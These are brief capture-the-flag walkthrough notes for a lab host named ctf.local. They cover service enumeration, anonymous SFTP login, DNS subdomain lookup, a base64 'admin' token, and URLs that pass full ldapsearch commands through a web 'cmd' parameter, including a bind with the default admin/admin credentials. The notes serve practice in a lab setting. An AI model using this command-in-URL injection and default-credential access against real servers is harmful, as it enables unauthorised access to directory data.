- Enumerate machines services
    - sftp is active 
        - login with user anonymous
- Look up for flags: 
    - Get anonymous user with a base64 password and dns domain to do a dig query to check subdomains
- Access the web server in /validate to get the next step info
    - You have to check DNS domains to get the web server where the server is in a subdomain of the zone
    - curl "http://www.ctf.local/validate?token=YWRtaW4=" --header "Host: www.ctf.local"    
    - The web server has the same ip of the machine but it has another name    
- Check other services, the base64 password is used to do a query on LDAP
     - First check the ldap base:
        - http://www.ctf.local/ldapquery?token=YWRtaW4=&cmd=ldapsearch+-x+-s+base+-b+%22%22+-H+ldap://ns-server-1+namingContexts
- Do a ldap search with cn=admin a default user to do this querys
    - http://www.ctf.local/ldapquery?token=YWRtaW4=&cmd=ldapsearch+-x+-D+cn=admin,dc=ctf,dc=local+-b+dc=ctf,dc=local+-H+ldap://localhost+-w+admin
